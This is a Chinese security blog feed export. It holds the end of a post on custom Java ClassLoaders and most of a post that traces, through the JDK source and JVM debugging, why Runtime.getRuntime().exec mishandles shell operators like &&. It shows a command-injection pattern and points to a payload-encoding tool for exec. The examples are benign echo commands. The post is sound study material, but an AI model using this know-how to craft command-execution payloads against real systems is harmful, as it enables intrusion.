class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            Object testInstance = testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取hello方法</span></span><br><span class="line">            Method method = testInstance.getClass().getMethod(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">            String str = (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从文件中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classpath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(String classpath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classpath = classpath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] classDate = getClassBinaryData(name);</span><br><span class="line">            <span class="comment">//System.out.println(Arrays.toString(classDate));</span></span><br><span class="line">            <span class="keyword">if</span> (classDate == <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123; <span class="comment">// defineClass方法将字节码转化为类</span></span><br><span class="line">                <span class="keyword">return</span> defineClass(name, classDate, <span class="number">0</span>, classDate.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125; <span class="comment">// 返回类的字节码</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBinaryData(String className) <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        InputStream in = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        String path = classpath + File.separatorChar + className.replace(<span class="string">'.'</span>, File.separatorChar) + <span class="string">".class"</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            in = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line">            out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span></span><br><span class="line">        &#123;</span><br><span class="line">            in.close();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网</a><br><a href="https://benjaminwhx.com/2018/08/26/Idea%E4%B8%AD%E9%82%A3%E4%BA%9B%E9%B2%9C%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/">Idea中那些鲜为人知的调试技巧</a><br><a href="https://cloud.tencent.com/developer/article/1149445">Java虚拟机–类加载器源码</a></p>]]></content>
    
    <summary type="html">
    
      在反序列化的学习过程中总是不可回避碰到这个点，这次就来简单看看。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java Runtime.getRuntime().exec由表及里</title>
    <link href="http://yoursite.com/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/"/>
    <id>http://yoursite.com/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/</id>
    <published>2020-01-11T14:32:03.000Z</published>
    <updated>2020-07-11T08:03:14.434Z</updated>
    
    <content type="html"><![CDATA[<!-- 这篇文章主要目的在于学习前人文章，并从更深入一点的角度探讨为什么Runtime.getRuntime().exec某些时候会失效这个问题。 --><!-- more --><p>本文发在<a href="https://xz.aliyun.com/t/7046">先知社区</a>，转载到自己博客上。</p><h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><p>测试代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"cmd which you want to exec"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看可以成功的情况<br><img src="1577676465197-1f34563e-7443-4f6c-9238-c0137558519e.png#align=left&display=inline&height=232&name=image.png&originHeight=464&originWidth=2472&size=112349&status=done&style=none&width=1236" alt="image.png"></p><p>再来看看不能成功的情况<br><img src="1577676563293-bef3ec10-84d5-4aa5-95b7-bec57b95d23e.png#align=left&display=inline&height=160&name=image.png&originHeight=320&originWidth=2354&size=88578&status=done&style=none&width=1177" alt="image.png"></p><p>这里 <code>&amp;&amp;</code> 并没有达到bash中的效果<br><img src="1577676687805-0c7e43fb-9d1d-4aa8-8ef6-7331003c1499.png#align=left&display=inline&height=82&name=image.png&originHeight=122&originWidth=1110&size=51524&status=done&style=none&width=746" alt="image.png"></p><p>如果以前有人问我为什么会出现这种，我会毫不犹豫的回答：<em>因为 <code>Runtime.getRuntime().exec</code>   执行命令的时候并没有shell上下文环境所以无法把类似于 <code>&amp;</code> <code>|</code> 这样的符号进行特殊处理。</em></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决这种问题的方法有两种<br>第一种就是对执行命令进行编码，<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码地址在这</a></p><p><img src="1577679919272-65599375-f5c5-4dd0-99fb-eae32d71c6fe.png#align=left&display=inline&height=378&name=image.png&originHeight=646&originWidth=1274&size=50358&status=done&style=none&width=746" alt="image.png"><br><img src="1577679973496-15f40fac-cdbc-48c5-a23c-63385bf3775e.png#align=left&display=inline&height=162&name=image.png&originHeight=324&originWidth=3298&size=104504&status=done&style=none&width=1649" alt="image.png"></p><p>第二种就是使用数组的形式命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] command = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 2333 2333 &amp;&amp; echo 2333 2333 2333"</span> &#125;;</span><br><span class="line">InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br></pre></td></tr></table></figure><p><img src="1577680147954-a2e442b8-dd8c-42c4-a578-41d879554491.png#align=left&display=inline&height=229&name=image.png&originHeight=458&originWidth=2918&size=146723&status=done&style=none&width=1459" alt="image.png"></p><p>至此从实战应用的角度这个问题已经解决了。</p><p>不过我们可以看到其实这第二种方法用到了 <code>&amp;</code> 上面 _Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 <code>&amp;</code> <code>|</code> <em>`</em><code>_</code> _这样的符号特殊处理。_这一结论似乎看起来并站不住脚?</p><p>下面来跟踪一下源码，看看到底发生了什么。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="当传入Runtime-getRuntime-exec的是字符串"><a href="#当传入Runtime-getRuntime-exec的是字符串" class="headerlink" title="当传入Runtime.getRuntime().exec的是字符串"></a>当传入Runtime.getRuntime().exec的是字符串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"echo 2333 &amp;&amp; echo 2333"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为传入的命令是String类型，所以进入 <code>java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File)</code>  。<strong>这里是第一个非常关键的点， <code>StringTokenizer</code> 会把传入的conmmand字符串按 <code>\t \n \r \f</code> 中的任意一个分割成数组cmdarray。</strong></p><p><img src="1577685833249-067f99be-c43e-4564-a18f-a47a6856861a.png#align=left&display=inline&height=211&name=image.png&originHeight=422&originWidth=2766&size=176007&status=done&style=none&width=1383" alt="image.png"><br><img src="1577686182902-31dc960d-5d35-42a5-8803-079771cf19b3.png#align=left&display=inline&height=186&name=image.png&originHeight=228&originWidth=916&size=22796&status=done&style=none&width=746" alt="image.png"></p><p>代码来到exec的多态实现 <code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code> ，exec内部调用了ProcessBuilder的start。<br><img src="1577686458188-5644d174-4a9f-4a06-a666-eb66296ce4d5.png#align=left&display=inline&height=130&name=image.png&originHeight=260&originWidth=1816&size=61763&status=done&style=none&width=908" alt="image.png"></p><p>ProcessBuilder.start内部又调用了ProcessImpl.start。<br><img src="1577686661547-d787e724-269b-4a25-95c6-1a87412d7e97.png#align=left&display=inline&height=127&name=image.png&originHeight=254&originWidth=2602&size=71237&status=done&style=none&width=1301" alt="image.png"></p><p>在ProcessImpl.start中有<strong>第二个非常关键的点我们可以看到程序把cmdarray第一个参数（cmdarray[0]）当成要执行的命令，把其后的部分（cmdarray[1:]）作为命令的参数转换成byte 数组 argBlock（具体规则是以\x00进行implode）。</strong><br><img src="1577687523856-aadd2b68-7973-4b49-a857-d554004c8f6e.png#align=left&display=inline&height=487&name=image.png&originHeight=974&originWidth=2514&size=281837&status=done&style=none&width=1257" alt="image.png"></p><p>ProcessImpl.start最后又会把处理好的参数传入UNIXProcess<br><img src="1577686887031-96670a59-cdca-4cf1-ad79-ee82474a18bb.png#align=left&display=inline&height=156&name=image.png&originHeight=312&originWidth=2602&size=86125&status=done&style=none&width=1301" alt="image.png"></p><p>UNIXProcess内部又调用了forkAndExec方法<br><img src="1577688234642-21446af8-71dc-42ef-a9a4-d4f549399445.png#align=left&display=inline&height=312&name=image.png&originHeight=624&originWidth=2776&size=186773&status=done&style=none&width=1388" alt="image.png"></p><p>这里的是forkAndExec是一个native方法。<br><img src="1577686970789-da810849-80d9-4eb2-b107-7bb1ce933b0f.png#align=left&display=inline&height=155&name=image.png&originHeight=310&originWidth=1994&size=74399&status=done&style=none&width=997" alt="image.png"></p><p>从变量的命名来看，在开发者的眼中prog是要执行的命令即 <code>echo</code> ，argBlock都是传给 <code>echo</code> 的参数即<code>2333\x00&amp;&amp;\x002333</code>且传给 <code>echo</code> 的参数个数argc是4<br>可见经过StringTokenizer对字符串中空格类的处理其实是一种java对命令执行的保护机制，他可以防御以下这种命令注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = <span class="string">"ping "</span> + 可控点;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>补一个完整的调用栈。<img src="1577687207316-a29ab55a-281b-4cd5-b8df-d35c5038dbb5.png#align=left&display=inline&height=200&name=image.png&originHeight=288&originWidth=1076&size=49512&status=done&style=none&width=746" alt="image.png"></p><h3 id="当传入Runtime-getRuntime-exec的是字符串数组"><a href="#当传入Runtime-getRuntime-exec的是字符串数组" class="headerlink" title="当传入Runtime.getRuntime().exec的是字符串数组"></a>当传入Runtime.getRuntime().exec的是字符串数组</h3><p>我们再来看看给Runtime传入数组的时候是什么情况。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> throws IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 &amp;&amp; echo 2333"</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这里传入的数组，所以并没有经StringTokenizer对字符串的分割处理这一步而是直接进入了。<code>java.lang.Runtime#exec(java.lang.String[])</code> 。<br><img src="1577689013179-27759f7d-39b7-453c-883c-674de2de614d.png#align=left&display=inline&height=75&name=image.png&originHeight=150&originWidth=2222&size=51052&status=done&style=none&width=1111" alt="image.png"></p><p>后面的流程和字符串的情形是一致的，最后来到forkAndExec<br><img src="1577689204761-132deaef-3c15-4894-8d8f-bc307ff0de8e.png#align=left&display=inline&height=318&name=image.png&originHeight=636&originWidth=2828&size=191238&status=done&style=none&width=1414" alt="image.png"></p><p>按照上面的说法这里 <code>/bin/bash</code> 是要执行的命令， <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> 是传给的 <code>/bin/bash</code> 的参数。</p><p>补一个调用栈<br><img src="1577891037047-1a96c772-57d2-4476-93b4-3460b8ea60b1.png#align=left&display=inline&height=129&name=image.png&originHeight=258&originWidth=1074&size=43587&status=done&style=none&width=537" alt="image.png"></p><h3 id="一个错误的想法"><a href="#一个错误的想法" class="headerlink" title="一个错误的想法"></a>一个错误的想法</h3><p>看到这里不知道你是不是有点晕，心底生出了疑问，在执行字符串的时候加上 <code>/bin/bash</code> 不就好了。像下面这样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"/bin/bash -c 'echo 2333 &amp;&amp; echo 2333'"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行试试看，发现什么结果都没有，推测应该是shell执行命令失败了。<br><img src="1577690492437-eb933d61-d2b5-4175-94e8-2707f0a04a80.png#align=left&display=inline&height=302&name=image.png&originHeight=604&originWidth=2076&size=124786&status=done&style=none&width=1038" alt="image.png"></p><p>为什么会失败呢？我们来diff一下和数组执行最后进native的层的区别。<br><img src="1577695145401-bada57bf-0499-4f8c-b33f-1d240cd142af.png#align=left&display=inline&height=774&name=image.png&originHeight=1548&originWidth=2786&size=270657&status=done&style=none&width=1393" alt="image.png"><br>可以看到prog都是 <code>/bin/bash</code> 但是字符串模式下执行的参数变成了 <code>-c\x00&#39;echo\x002333\x00&amp;&amp;\x00echo\x002333&#39;</code> ，对比数组模式 <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> 。可以发现字符串模式下因为<code>StringTokenizer</code>对字符串空格类字符的处理<strong>破坏了命令执行的语义</strong>。</p><p>如果再仔细看看会发现字符串模式argc为6而数组模式只有2。写到这里其实我还想钻以下牛角尖，凭什么6个参数最后就不能执行？</p><h3 id="进入jvm看看"><a href="#进入jvm看看" class="headerlink" title="进入jvm看看"></a>进入jvm看看</h3><p>带着这样的疑问，我自不量力的编译了java源码并现学了一下怎么调试jvm（调试的环境是ubuntu14.04+jdk8）下面是学习成果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 &amp;&amp; echo 2333"</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据java native函数命名规则可以知道forkAndExec对应的c函数是 <code>Java_java_lang_UNIXProcess_forkAndExec</code>  。<br><img src="1577891334880-c3954fc0-353f-4e3a-93d2-c05a22a1805b.png#align=left&display=inline&height=762&name=image.png&originHeight=1524&originWidth=1826&size=284743&status=done&style=none&width=913" alt="image.png"></p><p>这个函数初始化执行命令所需要一些变量（如输入输出错误流）以及提取并处理java传入进来的参数，最后调用startChild函数开启子进程。</p><p><img src="1577803126319-c17c1625-54d4-4a06-b2f4-f3e2d69f0912.png#align=left&display=inline&height=738&name=image.png&originHeight=1476&originWidth=2068&size=1476544&status=done&style=none&width=1034" alt="image.png"></p><p>startChild会根据是mode的数值不同进入不同的分支，mode由操作系统、libc版本决定。<br><img src="1577891592795-27719e34-85b1-49fb-94b9-6fbbb4bd7a4b.png#align=left&display=inline&height=640&name=image.png&originHeight=1280&originWidth=1956&size=187639&status=done&style=none&width=978" alt="image.png"></p><p>我这里进入了vforkChild，vforkChild会使用vfork开启一个子进程，并且在子进程内部调用了childProcess，在clion中为了调试进入子进程需要在进入之前在gdb调试框输入 <code>set follow-fork-mode child</code>  和 <code>set detach-on-fork off</code><br><img src="1577886759874-01492158-3589-42ae-8468-8ba3629cc2bc.png#align=left&display=inline&height=744&name=image.png&originHeight=1488&originWidth=1922&size=234923&status=done&style=none&width=961" alt="image.png"></p><p>childProcess中调用JDK_execvpe。<br><img src="1577892301729-741292b7-cee1-4ed8-9ce9-72fec7fc5783.png#align=left&display=inline&height=685&name=image.png&originHeight=1370&originWidth=1596&size=183821&status=done&style=none&width=798" 